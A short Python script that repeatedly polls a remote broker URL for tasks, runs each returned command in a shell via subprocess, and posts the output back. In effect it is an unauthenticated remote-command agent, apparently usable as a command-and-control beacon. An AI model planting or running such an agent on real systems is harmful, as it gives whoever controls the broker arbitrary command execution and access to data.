import requests
import time
import subprocess

BROKER_URL = "https://YOURDOMAIN.com/api"
AGENT_NAME = "Agent1"


def poll_broker():
    while True:
        try:
            r = requests.get(f"{BROKER_URL}/get_task.php?agent={AGENT_NAME}", timeout=10)
            task = r.json()
            if task and 'command' in task:
                print(f"Running: {task['command']}")
                try:
                    output = subprocess.check_output(task['command'], shell=True, text=True)
                except Exception as e:
                    output = str(e)
                requests.post(f"{BROKER_URL}/submit_result.php", json={
                    "task_id": task['id'],
                    "result": output
                })
        except Exception as e:
            print("Error:", e)
        time.sleep(5)


if __name__ == "__main__":
    poll_broker()
